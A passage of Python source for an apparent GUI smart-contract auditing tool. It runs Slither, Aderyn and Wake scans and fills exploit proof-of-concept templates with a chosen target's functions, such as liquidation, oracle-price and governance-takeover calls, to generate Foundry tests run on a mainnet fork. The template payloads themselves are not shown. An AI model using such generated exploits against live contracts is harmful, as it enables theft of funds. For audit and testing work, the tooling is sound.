        report_content.append(f"# Full Security Report: {project_name}\n")
        report_content.append(f"**Generated on:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

        scanners = [
            {"name": "Slither", "command": "slither ."},
            {"name": "Aderyn", "command": "aderyn", "output_file": "report.md"},
            {"name": "Wake", "command": "wake detect all"}
        ]

        for scanner in scanners:
            self.terminal_queue.put(f"<hr><b>Running {scanner['name']}...</b>")
            report_content.append(f"## {scanner['name']} Analysis\n\n")
            try:
                result = subprocess.run(scanner['command'], shell=True, cwd=project_root, capture_output=True, text=True)
                
                if result.returncode != 0:
                    self.terminal_queue.put(f"<span style='color:orange;'>{scanner['name']} finished with a non-zero exit code.</span>")
                    report_content.append(f"**⚠️ {scanner['name']} finished with errors. Output:**\n\n")
                
                # Handle Aderyn's specific markdown output
                if 'output_file' in scanner:
                    aderyn_report_path = os.path.join(project_root, scanner['output_file'])
                    if os.path.exists(aderyn_report_path):
                        with open(aderyn_report_path, 'r', errors='ignore') as f:
                            aderyn_content = f.read()
                        report_content.append(aderyn_content + "\n\n")
                        self.terminal_queue.put(f"<span style='color:green;'>✅ Parsed {scanner['name']}'s report.md</span>")
                    else:
                        report_content.append("Could not find Aderyn's `report.md` file.\n\n")
                        self.terminal_queue.put(f"<span style='color:red;'>Error: Could not find Aderyn's report file.</span>")

                # Handle stdout for other tools
                else:
                    output = result.stdout + result.stderr
                    if not output.strip():
                        output = "(No findings or output from scanner)"
                    report_content.append(f"```text\n{output}\n```\n\n")
                    self.terminal_queue.put(f"<span style='color:green;'>✅ Captured {scanner['name']} output.</span>")
            
            except FileNotFoundError:
                self.terminal_queue.put(f"<span style='color:red;'>Error: `{scanner['command'].split()[0]}` command not found. Is {scanner['name']} installed and in your PATH?</span>")
                report_content.append(f"**❌ ERROR: `{scanner['command'].split()[0]}` not found.**\n\n")
            except Exception as e:
                self.terminal_queue.put(f"<span style='color:red;'>An unexpected error occurred while running {scanner['name']}: {e}</span>")
                report_content.append(f"**❌ ERROR: An unexpected error occurred: {e}**\n\n")

        # Write the final consolidated report
        try:
            with open(report_path, 'w', errors='ignore') as f:
                f.write("".join(report_content))
            
            clickable_path = f"<a href='file:///{report_path}'>{report_path}</a>"
            self.terminal_queue.put(f"<hr><b style='color:lightgreen;'>🎉 Full Report Generated Successfully! 🎉</b>")
            self.terminal_queue.put(f"Report saved to: {clickable_path}")

        except Exception as e:
            self.terminal_queue.put(f"<span style='color:red;'>Error writing final report: {e}</span>")

    def generate_slither_exploit(self):
        if self.slither_vuln_dropdown.currentIndex() < 0:
            QMessageBox.warning(self, "No Vulnerability Selected", "Please select a vulnerability from the dropdown.")
            return

        data = self.slither_vuln_dropdown.currentData()
        if not data or not data.get('exploit'):
            QMessageBox.information(self, "No Exploit Available", "No automated PoC template is available for the selected finding.")
            return

        exploit_template_data = data['exploit']
        template_code = exploit_template_data.get('poc_code')

        if not template_code:
            QMessageBox.critical(self, "Error", "Exploit template is missing 'poc_code' in exploit_db.py.")
            return

        params = {}
        for key, widget in self.exploit_param_widgets.items():
            if isinstance(widget, QLineEdit):
                params[key] = widget.text()
            elif isinstance(widget, QComboBox):
                params[key] = widget.currentText()
        
        required_params = exploit_template_data.get('params', [])
        for p in ['attacker_contract_name', 'base_contract_name']:
             if p in required_params and p not in params:
                params[p] = p.replace("_", " ").title().replace(" ", "")

        target_contract_name = params.get('target_contract_name')
        if not target_contract_name or target_contract_name not in self.contract_map_data:
            QMessageBox.critical(self, "Error", "Target contract not found in map. Please ensure the map is generated and a target is selected.")
            return

        contract_data = self.contract_map_data[target_contract_name]
        source_file = contract_data.get('source_file_relative', 'Unknown.sol')

        final_code = template_code.replace("{CONTRACT_FILE_NAME}", source_file)

        for key, value in params.items():
            final_code = final_code.replace(f"{{{key.upper()}}}", value)

        file_name = f"Exploit_{exploit_template_data['name'].replace(' ', '_')}_{target_contract_name}.t.sol"
        self._write_test_file(file_name, final_code)

    def open_trophy_config_dialog(self, trophy_data):
        target_widget = self.exploit_param_widgets.get('target_contract_name')
        if not target_widget or not target_widget.currentText():
            QMessageBox.warning(self, "Target Not Selected", "Please select a target contract in the 'Parameters' panel first.")
            return

        target_name = target_widget.currentText()
        if target_name not in self.contract_map_data:
            QMessageBox.warning(self, "Map Error", f"Contract '{target_name}' not found in map. Please re-generate the map.")
            return
            
        contract_data = self.contract_map_data[target_name]
        
        dialog = TrophyConfigDialog(target_name, contract_data, trophy_data, self)
        if dialog.exec_() == QDialog.Accepted:
            config = dialog.get_values()
            file_path = self.generate_dynamic_trophy(config, target_name, contract_data, trophy_data)
            if file_path:
                self.run_forge_test_on_generated_file(file_path, config)

    def generate_dynamic_trophy(self, config, target_name, contract_data, trophy_data):
        self.terminal_queue.put(f"<b>Generating Dynamic Trophy: {trophy_data['name']} for {target_name}</b>")
        
        replacements = {}
        
        constructor = next((f for f in contract_data['functions'] if f['name'] == 'constructor'), None)
        constructor_args = [config.get(f'constructor_{i}', '') for i, p in enumerate(constructor['parameters'])] if constructor else []
        replacements['DEPLOY_TARGET_CONTRACT'] = f"target = new {target_name}({', '.join(constructor_args)});"

        for role in trophy_data.get('roles', []):
            func_name = config.get(f'role_{role}', '<None>')
            replacements[f'SETUP_{role.upper()}_CALL'] = f"// Role '{role}' not configured."
            replacements[f'{role.upper()}_CALL'] = f"// Role '{role}' not configured."
            if func_name != '<None>':
                if role == 'deposit':
                    replacements['SETUP_DEPOSIT_CALL'] = f"target.{func_name}(victim, victimCollateralAmount);"
                    replacements['DEPOSIT_DUST_CALL'] = f"target.{func_name}(dustVictim, 1 ether);"
                elif role == 'borrow':
                    replacements['SETUP_BORROW_CALL'] = f"target.{func_name}(victimDebt);"
                elif role == 'liquidate':
                    replacements['LIQUIDATE_CALL'] = f"target.{func_name}(victim, victimDebt);"
                    replacements['LIQUIDATE_PARTIAL_CALL'] = f"target.{func_name}(victim, partialRepayAmount);"
                elif role == 'getCreditLimit':
                    replacements['GET_CREDIT_LIMIT_ASSERTION'] = f"assertLt(target.{func_name}(victim), victimDebt);"
                elif role == 'getEscrow':
                    replacements['GET_ESCROW_CALL'] = f"MOCK_IEscrowPoC victimEscrow = MOCK_IEscrowPoC(payable(address(target.{func_name}(victim))));"
                elif role == 'pay':
                    replacements['ESCROW_PAY_CALL'] = f"victimEscrow.{func_name}(attacker, victimCollateral);"
                elif role == 'setOracle':
                     replacements['SET_ORACLE_CALL'] = f"target.{func_name}(address(oracle));"
                elif role == 'setPrice':
                     replacements['SET_PRICE_CALL_LOW'] = f"oracle.{func_name}(address(collateral), 0.6 ether);"
                     replacements['SET_PRICE_CALL_MED'] = f"oracle.{func_name}(address(collateral), 0.8 ether);"
                elif role == 'setGov':
                     replacements['SET_GOV_CALL'] = f"target.{func_name}(attacker);"
                elif role == 'createOrder':
                     replacements['CREATE_ORDER_CALL'] = f"orderId = target.{func_name}(podOrder, beanAmount);"
                elif role == 'cancelOrder':
                     replacements['CANCEL_ORDER_CALL'] = f"target.{func_name}(orderId);"
        
        test_function_code = trophy_data['code']
        for key, value in replacements.items():
            test_function_code = test_function_code.replace(f"{{{key}}}", value)

        final_code = DYNAMIC_TROPHY_BOILERPLATE
        final_code = final_code.replace("{CONTRACT_FILE_NAME}", contract_data['source_file_relative'])
        final_code = final_code.replace("{TARGET_CONTRACT_NAME}", target_name)
        final_code = final_code.replace("{VICTIM_COLLATERAL_AMOUNT}", config.get('victim_collateral', '0'))
        final_code = final_code.replace("{VICTIM_DEBT}", config.get('victim_debt', '0'))
        final_code = final_code.replace("{TEST_FUNCTION_CODE}", test_function_code)
        
        file_name_key = trophy_data['name'].replace(" ", "_").replace("&", "and")
        return self._write_test_file(f"DynamicTrophy_{target_name}_{file_name_key}.t.sol", final_code)

    def run_forge_test_on_generated_file(self, file_path, config):
        project_root = self.get_project_root()
        if not project_root:
            self.terminal_queue.put("<span style='color: red;'>No project context. Please select a Forge project folder.</span>")
            return
        
        relative_path = os.path.relpath(file_path, project_root)

        verbosity_text = self.test_verbosity_dropdown.currentText()
        flag_match = re.search(r'(-\w+)', verbosity_text)
        verbosity_flag = flag_match.group(1) if flag_match else "-vvv"

        fork_url = config.get('fork_url', 'mainnet').strip()

        command = f"forge test --match-path {shlex.quote(relative_path)} --fork-url {shlex.quote(fork_url)} {verbosity_flag}"
        
        self.clear_output()
        self.terminal_queue.put(f"<b>Running Generated Test on Mainnet Fork...</b>\n")
        self.run_command(command, cwd=project_root)

    def _generate_contract_map_thread(self, target_path):
        try:
            self.terminal_queue.put("Initializing Slither for contract mapping...")
            slither_instance = Slither(target_path, crytic_compile_kwargs={'framework': 'foundry'})

            with self.map_lock:
                self.contract_map_data = {}
                project_root = self.get_project_root()
                
                valid_contracts = [c for c in slither_instance.contracts if not c.is_library and not c.is_interface]
                if project_root: 
                    valid_contracts = [c for c in valid_contracts if str(c.source_mapping.filename.absolute).startswith(project_root)]

                for contract in valid_contracts:
                    source_file_full_path = str(contract.source_mapping.filename.absolute)
                    
                    if project_root:
                        relative_path = os.path.relpath(source_file_full_path, project_root).replace('\\', '/')
                    else:
                        relative_path = os.path.basename(source_file_full_path)
                    
                    contract_data = {"name": contract.name, "functions": [], "source_file_relative": relative_path}
                    
                    constructor = next((f for f in contract.functions_and_modifiers if f.is_constructor), None)
                    if constructor:
                         contract_data["functions"].append({
                            "name": "constructor", "signature": constructor.signature_str, "visibility": "public", 
                            "parameters": [{"name": p.name or f'param{i}', "type": str(p.type)} for i, p in enumerate(constructor.parameters)]
                        })

                    for func in contract.functions_and_modifiers:
                        if func.is_constructor or func.visibility not in ['public', 'external']: continue
                        contract_data["functions"].append({
                            "name": func.name, "signature": func.signature_str, "visibility": str(func.visibility), 
                            "parameters": [{"name": p.name or f'param{i}', "type": str(p.type)} for i, p in enumerate(func.parameters)]
                        })

                    self.contract_map_data[contract.name] = contract_data

                self.is_map_ready = True
                self.terminal_queue.put("<span style='color: green;'><br>✅ Map generated. Exploit parameters updated.</span>")
                self.terminal_queue.put("UPDATE_EXPLOIT_UI")
        except SlitherError as e:
            self.terminal_queue.put(f"<span style='color: red;'><br>Slither mapping error: {e}<br>Ensure the project is correctly compiled before mapping.</span>")
            self.is_map_ready = False
        except Exception as e:
            self.terminal_queue.put(f"<span style='color: red;'><br>An unexpected mapping error occurred: {e}</span>")
            self.is_map_ready = False

    def update_output(self):
        while not self.terminal_queue.empty():
            try:
                text = self.terminal_queue.get_nowait()
                if text == "FILTER_AND_UPDATE_VULNS": self.filter_and_update_slither_dropdown()
                elif text == "UPDATE_EXPLOIT_UI": self.update_exploit_params()
                else: self.terminal_output.append(text)
            except Exception: pass 

    def copy_terminal_output(self):
        QApplication.clipboard().setText(self.terminal_output.toPlainText())
        self.terminal_queue.put("Terminal output copied to clipboard.")

    def _write_test_file(self, filename, content):
        if self.get_project_root():
            base_dir = os.path.join(self.get_project_root(), "test")
        elif self.selected_contract:
            base_dir = os.path.dirname(self.selected_contract)
        else:
            self.terminal_queue.put("<span style='color:orange;'>No project or file selected. Cannot write test file.</span>")
            return None
        
        safe_filename = re.sub(r'[^\w.-]', '_', filename)
        os.makedirs(base_dir, exist_ok=True)
        poc_file_path = os.path.join(base_dir, safe_filename)

        try:
            with open(poc_file_path, "w") as f:
                f.write(content)
            clickable_path = f"<a href='file:///{poc_file_path}'>{poc_file_path}</a>"
            self.terminal_queue.put(f"✅ Generated Test File: {clickable_path}\n<pre>{html.escape(content)}</pre>\n")
            return poc_file_path
        except Exception as e:
            self.terminal_queue.put(f"<span style='color: red;'>Error writing test file: {e}</span>")
            return None

    def run_command(self, command, cwd=None):
        def target():
            try:
                log_msg = f"<b>Executing:</b> <span style='color:#87CEEB;'>{command}</span>" + (f" in {cwd}" if cwd else "") + "\n"
                self.terminal_queue.put(log_msg)

                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, cwd=cwd, bufsize=1, universal_newlines=True)
                for line in iter(process.stdout.readline, ''):
                    self.terminal_queue.put(html.escape(line).replace('\n', '<br>'))
                process.wait()
                if process.returncode != 0:
                    self.terminal_queue.put(f"<span style='color:orange;'>Command finished with non-zero exit code: {process.returncode}</span>")
            except Exception as e:
                self.terminal_queue.put(f"<span style='color:red;'>Error executing command: {e}</span>\n")

        threading.Thread(target=target, daemon=True).start()
    
    def explorer_context_menu(self, position):
        index = self.file_explorer.indexAt(position)
        if not index.isValid(): return
        
        path = self.fs_model.filePath(index)
        menu = QMenu()
        open_action = menu.addAction("Open File")
        delete_action = menu.addAction("Delete")
        
        action = menu.exec_(self.file_explorer.viewport().mapToGlobal(position))
        
        if action == open_action:
            try:
                if sys.platform == "win32": os.startfile(path)
                elif sys.platform == "darwin": subprocess.run(["open", path], check=False)
                else: subprocess.run(["xdg-open", path], check=False)
            except Exception as e: self.terminal_queue.put(f"<span style='color:red;'>Could not open file: {e}</span>")
        elif action == delete_action:
            reply = QMessageBox.question(self, 'Delete Confirmation', 
                                         f"Are you sure you want to permanently delete {os.path.basename(path)}?",
                                         QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
            if reply == QMessageBox.Yes:
                try:
                    if os.path.isfile(path): os.remove(path)
                    elif os.path.isdir(path): shutil.rmtree(path)
                    self.terminal_queue.put(f"<span style='color:orange;'>Deleted: {path}</span>")
                except Exception as e: self.terminal_queue.put(f"<span style='color:red;'>Error deleting: {e}</span>")

    def on_file_explorer_activated(self, index):
        file_path = self.fs_model.filePath(index)
        if os.path.isfile(file_path) and file_path.endswith(('.sol', '.toml', '.json', '.js', '.ts')):
            self.clear_output()
            self.terminal_queue.put(f"<b>Displaying content for:</b> {os.path.basename(file_path)}\n")
            try:
                with open(file_path, 'r', errors='ignore') as f:
                    content = f.read()
                self.terminal_queue.put(f"<pre>{html.escape(content)}</pre>")
            except Exception as e: self.terminal_queue.put(f"<span style='color:red;'>Could not read file: {e}</span>")

    def select_project_folder(self):
        folder_name = QFileDialog.getExistingDirectory(self, "Select Project Folder", self.home_dir)
        if folder_name:
            self.selected_project_path = folder_name
            self.selected_contract = None 
            self.clear_output()
            self.terminal_queue.put(f"<b>Selected Project:</b> {folder_name}\n")
            self.file_explorer.setRootIndex(self.fs_model.index(folder_name))
            
    def select_contract(self):
        filename, _ = QFileDialog.getOpenFileName(self, "Select Contract", self.home_dir, "Solidity Files (*.sol)")
        if filename:
            self.selected_contract = filename
            self.selected_project_path = None 
            self.clear_output()
            self.terminal_queue.put(f"<b>Selected Single File:</b> {filename}\n")
            self.file_explorer.setRootIndex(self.fs_model.index(os.path.dirname(filename)))
            self.generate_contract_map()
    
    def on_vulnerability_selected(self, index):
        if self.slither_vuln_dropdown.currentIndex() >= 0:
            data = self.slither_vuln_dropdown.itemData(index)
            if data:
                self.generate_exploit_button.setEnabled(data.get('exploit') is not None)
                self.update_exploit_params(data.get('finding'))

    def update_exploit_params(self, finding_data=None):
        for layout in [self.exploit_params_layout, self.function_params_layout]:
            while layout.count():
                child = layout.takeAt(0)
                if child.widget(): child.widget().deleteLater()
        self.exploit_param_widgets = {}

        if not self.is_map_ready or not self.contract_map_data:
            self.exploit_params_layout.addRow(QLabel("<i>Run 'Generate Project Map' first</i>"))
            return

        target_combo = QComboBox()
        target_combo.addItems(["<Select a contract>"] + sorted(self.contract_map_data.keys()))
        self.exploit_params_layout.addRow(QLabel("Target Contract:"), target_combo)
        self.exploit_param_widgets['target_contract_name'] = target_combo

        function_combo = QComboBox()
        self.exploit_params_layout.addRow(QLabel("Function To Exploit:"), function_combo)
        self.exploit_param_widgets['vulnerable_function'] = function_combo

        def _update_function_list(contract_name):
            function_combo.clear()
            if contract_name in self.contract_map_data:
                all_funcs = sorted(list(set(
                    f['name'] for f in self.contract_map_data[contract_name].get('functions', [])
                    if f['name'] != 'constructor'
                )))
                function_combo.addItems(["<Select a function>"] + all_funcs)

        target_combo.currentTextChanged.connect(_update_function_list)
        target_combo.currentTextChanged.connect(lambda: self.update_function_fields(finding_data))

        if finding_data and 'contract' in finding_data:
            contract_name = finding_data['contract']
            index = target_combo.findText(contract_name)
            if index >= 0:
                target_combo.setCurrentIndex(index)
            else:
                _update_function_list(target_combo.currentText())
        else:
            _update_function_list(target_combo.currentText())

        if finding_data and 'function_name' in finding_data:
            function_name = finding_data['function_name'].split('(')[0]
            index = function_combo.findText(function_name)
            if index >= 0:
                function_combo.setCurrentIndex(index)

        self.update_function_fields(finding_data)
        
    def update_function_fields(self, finding_data=None):
        while self.function_params_layout.count():
            child = self.function_params_layout.takeAt(0)
            if child.widget(): child.widget().deleteLater()
        
        if not finding_data: return

        data_index = self.slither_vuln_dropdown.findText(self.slither_vuln_dropdown.currentText())
        if data_index == -1: return
        data = self.slither_vuln_dropdown.itemData(data_index)
        if not data or not data.get('exploit'): return

        current_target_name = self.exploit_param_widgets.get('target_contract_name').currentText()
        if not current_target_name or current_target_name not in self.contract_map_data: return
        
        all_funcs = [f['name'] for f in self.contract_map_data[current_target_name].get('functions', [])]
        
        for param_name in data['exploit'].get("params", []):
            if param_name in ['target_contract_name', 'contract_file_name', 'attacker_contract_name', 'base_contract_name']:
                continue
            
            label_text = param_name.replace("_", " ").title()
            
            if param_name.endswith("_function_name"):
                combo = QComboBox()
                combo.addItems(["<None>"] + all_funcs)
                self.function_params_layout.addRow(QLabel(label_text), combo)
                self.exploit_param_widgets[param_name] = combo
                
                if 'function_name' in finding_data:
                    func_name_only = finding_data['function_name'].split('(')[0]
                    if func_name_only in all_funcs: combo.setCurrentText(func_name_only)
            else:
                line_edit = QLineEdit()
                self.function_params_layout.addRow(QLabel(label_text), line_edit)
                self.exploit_param_widgets[param_name] = line_edit
    
    def run_slither_scan_only(self):
        target_path = self.get_project_root() or self.selected_contract
        if not target_path:
            self.terminal_queue.put("<span style='color: red;'>Please select a project folder or a single file first.</span>")
            return
            
        self.clear_output()
        self.terminal_queue.put(f"<b>Starting Slither scan for: {target_path}</b>\n")
        def scan_thread():
            try:
                self.terminal_queue.put("<b>Running Slither... (This may take a moment)</b>\n")
                results_dir = os.path.dirname(target_path) if os.path.isfile(target_path) else target_path
                json_path = os.path.join(results_dir, "slither_results.json")
                
                command = f"slither ." if self.get_project_root() else f"slither {shlex.quote(target_path)}"
                
                custom_detector_path = self.custom_detector_path_input.text().strip()
                if custom_detector_path:
                    command += f" --detect {shlex.quote(custom_detector_path)}"
                
                command += f" --json {shlex.quote(json_path)}"
                
                cwd = self.get_project_root() or os.path.dirname(target_path)
                process = subprocess.run(command, shell=True, cwd=cwd, capture_output=True, text=True)
                
                self.terminal_queue.put(f"<pre>{html.escape(process.stdout + process.stderr)}</pre>")

                if os.path.exists(json_path):
                    with open(json_path) as f:
                        slither_findings = json.load(f)
                    
                    self.slither_findings = self.parse_slither_json(slither_findings)
                    self.process_slither_findings()
                    self.terminal_queue.put("FILTER_AND_UPDATE_VULNS")
                    self.terminal_queue.put("<span style='color: green;'>✅ Scan complete. Vulnerabilities loaded.</span>\n")
                else:
                    self.terminal_queue.put("<span style='color: red;'><b>Scan failed.</b> Slither JSON results file not created. Check Slither output for errors.</span>")
            except Exception as e:
                self.terminal_queue.put(f"<span style='color: red;'>An unexpected error occurred during Slither scan: {e}</span>")
        threading.Thread(target=scan_thread, daemon=True).start()

    def parse_slither_json(self, data):
        findings = []
        if not data.get("success", False):
            self.terminal_queue.put("<span style='color:orange;'>Slither analysis reported issues. Results may be incomplete.</span>")
            if "results" not in data or "detectors" not in data["results"]:
                 return []
        
        for result in data["results"]["detectors"]:
            impact = result.get('impact', 'Informational')
            for element in result.get('elements', []):
                finding = {
                    'check': result['check'], 
                    'description': result['description'], 
                    'impact': impact
                }
                if element.get('type') == 'function':
                    finding['function_name'] = element.get('name', '')
                    finding['contract'] = element.get('contract', {}).get('name', 'Unknown')
                elif element.get('type') == 'contract':
                    finding['function_name'] = '(contract-level)'
                    finding['contract'] = element.get('name', 'Unknown')
                else:
                    source_file = element.get('source_mapping', {}).get('filename_relative', '')
                    contract_name = 'Unknown'
                    for c_name, c_data in self.contract_map_data.items():
                        if c_data.get('source_file_relative') == source_file:
                            contract_name = c_name
                            break
                    finding['function_name'] = '(file-level)'
                    finding['contract'] = contract_name

                findings.append(finding)
        return findings

    def process_slither_findings(self):
        self.processed_slither_findings = []
        impact_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Informational": 4}
        for finding in self.slither_findings:
            display_impact = finding.get("impact", "Informational").capitalize()
            exploit = next((ex for ex in EXPLOIT_TEMPLATES.values() if finding['check'] in ex.get("detector_ids", [])), None)
            if exploit and 'impact' in exploit: display_impact = exploit['impact']
            self.processed_slither_findings.append({'finding': finding, 'exploit': exploit, 'display_impact': display_impact})
        
        self.processed_slither_findings.sort(key=lambda x: (impact_order.get(x['display_impact'], 99), x['finding']['check']))

    def filter_and_update_slither_dropdown(self):
        selected_impact = self.impact_filter_dropdown.currentText()
        filtered_list = self.processed_slither_findings if selected_impact == "All" else [f for f in self.processed_slither_findings if f['display_impact'] == selected_impact]
        self.update_slither_dropdown(filtered_list)

    def update_slither_dropdown(self, findings_to_display):
        dropdown = self.slither_vuln_dropdown
        dropdown.blockSignals(True)
        dropdown.clear()
        
        if not findings_to_display:
            dropdown.addItem("No findings match filter")
            dropdown.setEnabled(False)
        else:
            for item in findings_to_display:
                finding = item['finding']
                impact = item['display_impact']
                
                poc_ready_signal = ""
                if item.get('exploit'):
                    poc_ready_signal = "[PoC Ready] "

                prefix = f"[{impact.upper()}] "
                location_name = f"{finding.get('contract', 'Unknown')}.{finding.get('function_name', '')}"
                if ".(" in location_name:
                    location_name = finding.get('contract', 'Unknown')

                display_text = f"{poc_ready_signal}{prefix}{finding['check']} in {location_name}"
                dropdown.addItem(display_text, userData=item)
            dropdown.setEnabled(True)
            
        dropdown.blockSignals(False)
        if dropdown.count() > 0: self.on_vulnerability_selected(0)

    def generate_contract_map(self):
        self.clear_output()
        target_path = self.get_project_root() or self.selected_contract
        if not target_path:
            self.terminal_queue.put("<span style='color:orange;'>Please select a Forge project or a single file first.</span>")
            return
        
        if self.get_project_root() and not os.path.exists(os.path.join(target_path, 'foundry.toml')):
            self.terminal_queue.put("<span style='color:orange;'>Warning: `foundry.toml` not found. Use 'Initialize Foreign Project' first.</span>")
            return
            
        self.is_map_ready = False
        self.terminal_queue.put(f"<b>Mapping {os.path.basename(target_path)}...</b> This might take a moment.\n")
        threading.Thread(target=self._generate_contract_map_thread, args=(target_path,), daemon=True).start()

    def run_forge_install(self):
        project_root = self.get_project_root()
        if not project_root:
            self.terminal_queue.put("<span style='color: red;'>Please select a Forge project folder first.</span>")
            return
            
        items = [
            "OpenZeppelin/openzeppelin-contracts@v4.9.3",
            "OpenZeppelin/openzeppelin-contracts",
            "solmate/solmate",
            "foundry-rs/forge-std",
            "(Custom...)"
        ]

        item, ok = QInputDialog.getItem(self, "Install Dependency", 
                                        "Select a common library or choose Custom:", items, 0, False)

        package_name = None
        if ok and item:
            if item == "(Custom...)":
                text, text_ok = QInputDialog.getText(self, 'Custom Install', 'Enter package (e.g., user/repo@version):')
                if text_ok and text.strip():
                    package_name = text.strip()
            else:
                package_name = item
        
        if package_name:
            command = f"forge install {package_name}"
            self.clear_output()
            self.terminal_queue.put(f"<b>Running `{command}` for project: {project_root}</b>\n")
            self.run_command(command, cwd=project_root)

    def run_forge_build(self):
        project_root = self.get_project_root()
        if not project_root:
            self.terminal_queue.put("<span style='color: red;'>Please select a Forge project folder first.</span>")
            return
        self.clear_output()
        self.terminal_queue.put(f"<b>Running `forge build` for project: {project_root}</b>\n")
        self.run_command("forge build", cwd=project_root)

    def run_forge_clean(self):
        project_root = self.get_project_root()
        if not project_root:
            self.terminal_queue.put("<span style='color: red;'>Please select a Forge project folder first.</span>")
            return
        self.clear_output()
        self.terminal_queue.put(f"<b>Running `forge clean` for project: {project_root}</b>\n")
        self.run_command("forge clean", cwd=project_root)
        
    def run_npm_install(self):
        project_root = self.get_project_root()
        if not project_root:
            self.terminal_queue.put("<span style='color: red;'>Please select a Forge project folder first.</span>")
            return
        self.clear_output()
        if os.path.exists(os.path.join(project_root, 'yarn.lock')):
            command = "yarn install --verbose"
            self.terminal_queue.put(f"<b>`yarn.lock` detected. Running `{command}`...</b>\n")
            self.run_command(command, cwd=project_root)
        else:
            command = "npm install"
            self.terminal_queue.put(f"<b>Running `{command}`...</b>\n")
            self.run_command(command, cwd=project_root)

    def initialize_foreign_project(self):
        project_root = self.get_project_root()
        if not project_root:
            self.terminal_queue.put("<span style='color: red;'>Please select a project folder first.</span>")
            return

        reply = QMessageBox.question(self, 'Confirm Initialization',
                                     "This will initialize a Foundry project in the selected directory.\n"
                                     "It will create a `foundry.toml` and may overwrite existing config.\n\n"
                                     "This is intended for non-Foundry projects (like Hardhat). Continue?",
                                     QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.No:
            return

        self.clear_output()
        threading.Thread(target=self._initialize_foreign_project_thread, daemon=True).start()

    def _initialize_foreign_project_thread(self):
        project_root = self.get_project_root()
        self.terminal_queue.put("<b>🤖 Starting Foreign Project Initialization...</b>")
        
        src_path = os.path.join(project_root, 'src')
        contracts_path = os.path.join(project_root, 'contracts')
        if not os.path.isdir(src_path) and not os.path.isdir(contracts_path):
            self.terminal_queue.put("<hr><b style='color:red;'>Initialization Failed: Source Directory Not Found.</b>")
            self.terminal_queue.put("The selected folder does not appear to contain a `src` or `contracts` directory.")
            self.terminal_queue.put("Please ensure you have selected the correct root folder of the smart contract project, not a parent directory.")
            return
        
        try:
            self.terminal_queue.put("<hr><b>Step 1: Running `forge init --force`...</b>")
            init_cmd = f"forge init --force"
            result = subprocess.run(init_cmd, shell=True, cwd=project_root, capture_output=True, text=True)
            self.terminal_queue.put(f"<pre>{html.escape(result.stdout + result.stderr)}</pre>")
            if result.returncode != 0:
                self.terminal_queue.put(f"<span style='color:red;'>Forge init failed. Aborting.</span>")
                return
            self.terminal_queue.put("<span style='color:green;'>✅ Forge project initialized.</span>")

            self.terminal_queue.put("<hr><b>Step 2: Cleaning up default files...</b>")
            for path_to_remove in ['src', 'test/Counter.t.sol', 'script/Counter.s.sol']:
                full_path = os.path.join(project_root, path_to_remove)
                try:
                    if os.path.isdir(full_path) and path_to_remove == 'src':
                        shutil.rmtree(full_path)
                        self.terminal_queue.put(f"   - Removed empty `src` directory created by init.")
                    elif os.path.isfile(full_path):
                        os.remove(full_path)
                        self.terminal_queue.put(f"   - Removed file: {path_to_remove}")
                except Exception as e:
                    self.terminal_queue.put(f"<span style='color:orange;'>Could not remove {path_to_remove}: {e}</span>")
            self.terminal_queue.put("<span style='color:green;'>✅ Default files cleaned.</span>")

            self.terminal_queue.put("<hr><b>Step 3: Configuring `foundry.toml`...</b>")
            toml_path = os.path.join(project_root, 'foundry.toml')
            try:
                with open(toml_path, 'r') as f:
                    config = toml.load(f)

                profile = config.setdefault('profile', {}).setdefault('default', {})
                
                source_dir_name = 'contracts' if os.path.isdir(contracts_path) else 'src'
                profile['src'] = source_dir_name
                profile['test'] = 'test'
                profile['libs'] = ['lib']
                self.terminal_queue.put(f"   - Auto-detected and set `src` to `{source_dir_name}`")

                remappings = profile.setdefault('remappings', [])
                oz_remapping = '@openzeppelin/contracts/=node_modules/@openzeppelin/contracts/'
                if oz_remapping not in remappings:
                    remappings.append(oz_remapping)
                    self.terminal_queue.put(f"   - Added remapping for OpenZeppelin: `{oz_remapping}`")

                forge_std_remapping = 'forge-std/=lib/forge-std/src/'
                if forge_std_remapping not in remappings:
                    remappings.append(forge_std_remapping)

                with open(toml_path, 'w') as f:
                    toml.dump(config, f)
                self.terminal_queue.put("<span style='color:green;'>✅ `foundry.toml` configured successfully.</span>")

            except Exception as e:
                self.terminal_queue.put(f"<span style='color:red;'>Failed to configure `foundry.toml`: {e}</span>")
                return

            self.terminal_queue.put("<hr><b>Step 4: Installing Node.js dependencies...</b>")
            if os.path.exists(os.path.join(project_root, 'yarn.lock')):
                npm_cmd = "yarn install --verbose"
            elif os.path.exists(os.path.join(project_root, 'package.json')):
                npm_cmd = "npm install"
            else:
                npm_cmd = None

            if npm_cmd:
                result = subprocess.run(npm_cmd, shell=True, cwd=project_root, capture_output=True, text=True)
                if result.returncode != 0:
                     self.terminal_queue.put(f"<pre style='color:orange;'>{html.escape(result.stdout + result.stderr)}</pre>")
                     self.terminal_queue.put(f"<span style='color:orange;'>JS dependency installation failed, but continuing...</span>")
                else:
                    self.terminal_queue.put("<span style='color:green;'>✅ Node.js dependencies installed.</span>")
            else:
                self.terminal_queue.put("   - No `yarn.lock` or `package.json` found, skipping.")

            self.terminal_queue.put("<hr><b>Step 5: Installing Solidity dependencies...</b>")
            install_cmd = "forge install"
            result = subprocess.run(install_cmd, shell=True, cwd=project_root, capture_output=True, text=True)
            self.terminal_queue.put(f"<pre>{html.escape(result.stdout + result.stderr)}</pre>")
            if result.returncode != 0:
                self.terminal_queue.put(f"<span style='color:orange;'>Forge install may have failed, check output. Continuing...</span>")
            else:
                self.terminal_queue.put("<span style='color:green;'>✅ Solidity dependencies installed.</span>")

            self.terminal_queue.put("<hr><b>Step 6: Building the project...</b>")
            build_cmd = "forge build"
            result = subprocess.run(build_cmd, shell=True, cwd=project_root, capture_output=True, text=True)
            self.terminal_queue.put(f"<pre>{html.escape(result.stdout + result.stderr)}</pre>")
            if result.returncode != 0:
                 self.terminal_queue.put(f"<span style='color:red;'>Build failed! Check the output for errors.</span>")
                 return
            
            self.terminal_queue.put("<hr><b style='color:lightgreen;'>🎉 PROJECT INITIALIZATION COMPLETE! 🎉</b>")
            self.terminal_queue.put("You can now run 'Generate/Refresh Project Map' or other analysis tools.")

        except Exception as e:
